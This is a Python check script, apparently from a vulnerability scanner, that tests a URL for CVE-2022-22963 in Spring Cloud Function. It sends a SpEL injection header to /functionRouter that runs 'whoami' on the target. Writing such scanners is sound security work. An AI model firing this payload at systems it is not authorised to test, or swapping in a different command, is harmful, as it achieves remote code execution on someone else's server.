#!/usr/local/bin/python3
# -*- coding: utf-8 -*-
"""
   File Name：     cve_2022_22963.py
   Description :  Check for CVE_2022_22963 vulnerability
   Author :       sule01u
   date：          2023/10/5
"""
import requests
import random
from configs.custom_headers import USER_AGENTS
from utils.format_utils import format_url
requests.packages.urllib3.disable_warnings()


def check(target_url, proxies=None):
    """
    对给定的目标URL检测CVE-2022-22963漏洞。

    参数:
    - target_url: 待检测的目标URL
    - proxies: 代理配置
    """

    payload = f'T(java.lang.Runtime).getRuntime().exec("whoami")'
    headers = {
        'spring.cloud.function.routing-expression': payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': random.choice(USER_AGENTS),
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    # 创建请求URL
    request_url = format_url(target_url, "http").rstrip("/") + "/functionRouter"

    try:
        if proxies:
            response = requests.post(request_url, headers=headers, data='test', verify=False, proxies=proxies, timeout=6)
        else:
            response = requests.post(request_url, headers=headers, data='test', verify=False, timeout=6)

        # 检查响应内容来判断漏洞是否存在
        if response.status_code == 500 and '"error":"Internal Server Error"' in response.text:
            return True, {
                "CVE_ID": "CVE-2022-22963",
                "URL": request_url,
                "Details": "检测到CVE-2022-22963的RCE漏洞"
            }
        else:
            return False, {
                "CVE_ID": "CVE-2022-22963",
                "URL": target_url,
                "Details": "未检测到CVE-2022-22963的RCE漏洞"
            }
    except requests.RequestException as e:
        return False, {
            "CVE_ID": "CVE-2022-22963",
            "URL": target_url,
            "Details": f"请求发生错误: {e}"
        }


if __name__ == "__main__":
    target = "http://localhost:8080/"
    is_vulnerable, result = check(format_url(target, "http"))
    print(result)